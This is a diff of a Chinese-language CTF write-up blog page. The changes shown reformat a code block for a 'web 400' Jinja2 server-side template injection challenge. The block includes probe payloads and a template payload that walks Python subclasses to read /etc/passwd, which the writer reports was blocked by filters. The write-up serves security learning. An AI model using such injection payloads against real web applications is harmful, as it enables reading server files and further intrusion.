@@ -107,7 +107,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/searchbox2.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/gitfun2.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/gitfun1.PNG">
-<meta property="og:updated_time" content="2018-04-10T15:30:30.354Z">
+<meta property="og:updated_time" content="2018-04-10T15:34:01.117Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="近期ctf杂记">
 <meta name="twitter:description" content="近期ctftime上的几个比赛">
@@ -408,7 +408,7 @@
 <h3 id="web-400"><a href="#web-400" class="headerlink" title="web 400"></a>web 400</h3><p>查看网站参数可能是注入</p>
 <p>实际上是 Jinja2 ssti模板注入 但是进行了一些过滤 但但是过滤的地方可以用 +  来绕过</p>
 <p>之前看过ssti的文章 <a href="http://klaus.link/2017/Flask_SSTI/" target="_blank" rel="external">http://klaus.link/2017/Flask_SSTI/</a></p>
-<p>首先试一下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;7*7&#125;&#125;</div><div class="line">``` 可以 </div><div class="line">```bash</div><div class="line">&#123;&#123;<span class="string">'7'</span>*7&#125;&#125;</div><div class="line">``` 也可以 </div><div class="line"></div><div class="line">尝试</div><div class="line">```bash</div><div class="line">&#123;&#123; <span class="string">''</span>.class.mro[2].subclasses()[40](<span class="string">'/etc/passwd'</span>).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
+<p>首先试一下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;&#123;7*7&#125;&#125;</div><div class="line">``` </div><div class="line">可以 </div><div class="line">```bash</div><div class="line">&#123;&#123;<span class="string">'7'</span>*7&#125;&#125;</div><div class="line">``` </div><div class="line">也可以 </div><div class="line"></div><div class="line">尝试</div><div class="line">```bash</div><div class="line">&#123;&#123; <span class="string">''</span>.class.mro[2].subclasses()[40](<span class="string">'/etc/passwd'</span>).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
 <p>不行</p>
 <p>class mro等被过滤</p>
 <ul>
